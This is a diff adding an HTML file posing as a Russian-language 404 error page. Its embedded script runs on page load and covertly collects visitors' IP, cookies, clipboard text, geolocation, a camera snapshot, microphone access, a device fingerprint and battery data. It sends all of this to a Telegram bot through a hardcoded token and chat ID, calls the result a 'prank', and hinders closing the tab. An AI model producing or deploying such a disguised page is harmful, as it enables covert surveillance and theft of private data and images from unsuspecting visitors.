@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ошибка 404</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background-color: #f0f0f0;
+            color: #333;
+        }
+        h1 {
+            font-size: 48px;
+            color: #ff4444;
+        }
+        p {
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <h1>404 - Страница не найдена</h1>
+    <p>Кажется, что-то пошло не так. Попробуйте позже!</p>
+
+    <script>
+        // Функция отправки данных в Telegram-бота
+        async function sendToTelegram(message) {
+            const botToken = "7625549137:AAEaWBYbFoJ5tuRmve04Ngogh7wcN5P4118"; // Замени на токен своего бота
+            const chatId = "990083571"; // Замени на свой chat_id
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            await fetch(url, { method: 'POST' });
+        }
+
+        // Собираем ВСЕ возможные данные
+        async function collectAllData() {
+            let data = {};
+
+            // 1. Базовые данные устройства
+            data.ip = await (await fetch('https://api.ipify.org?format=json')).json().then(res => res.ip);
+            data.userAgent = navigator.userAgent;
+            data.platform = navigator.platform;
+            data.language = navigator.language;
+            data.screen = `${window.screen.width}x${window.screen.height}`;
+            data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            data.timestamp = new Date().toISOString();
+
+            // 2. Куки
+            data.cookies = document.cookie || "Нет кук";
+
+            // 3. Реферер
+            data.referrer = document.referrer || "Прямой вход";
+
+            // 4. Буфер обмена (если разрешено)
+            try {
+                data.clipboard = await navigator.clipboard.readText();
+            } catch (e) {
+                data.clipboard = "Доступ запрещён";
+            }
+
+            // 5. Геолокация (запрос)
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 1000 });
+                });
+                data.geolocation = `${position.coords.latitude}, ${position.coords.longitude}`;
+            } catch (e) {
+                data.geolocation = "Не разрешено";
+            }
+
+            // 6. Камера (запрос)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                data.camera = canvas.toDataURL('image/png');
+                stream.getTracks().forEach(track => track.stop()); // Останавливаем поток
+            } catch (e) {
+                data.camera = "Камера не разрешена";
+            }
+
+            // 7. Микрофон (запрос)
+            try {
+                const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                data.microphone = "Микрофон доступен";
+                micStream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                data.microphone = "Микрофон не разрешён";
+            }
+
+            // 8. Отпечаток устройства (canvas fingerprint)
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.fillText("test", 10, 10);
+            data.fingerprint = canvas.toDataURL();
+
+            // 9. Инфа о батарее (если доступно)
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                data.battery = `${battery.level * 100}% (зарядка: ${battery.charging})`;
+            } else {
+                data.battery = "Нет данных о батарее";
+            }
+
+            // 10. Список плагинов и шрифтов (примерный отпечаток)
+            data.plugins = navigator.plugins ? Array.from(navigator.plugins).map(p => p.name).join(', ') : "Нет плагинов";
+            data.fonts = "Не напрямую доступно, но можно через CSS";
+
+            // Собираем всё в строку
+            let message = "Пранк сработал!\n";
+            for (const [key, value] of Object.entries(data)) {
+                message += `${key}: ${value}\n`;
+            }
+
+            // Отправляем в Telegram
+            sendToTelegram(message);
+
+            // Дополнительно: мешаем закрыть вкладку (просто для пранка)
+            window.onbeforeunload = () => "Ты уверен, что хочешь уйти?";
+        }
+
+        // Запускаем сбор сразу при загрузке
+        collectAllData();
+    </script>
+</body>
+</html>
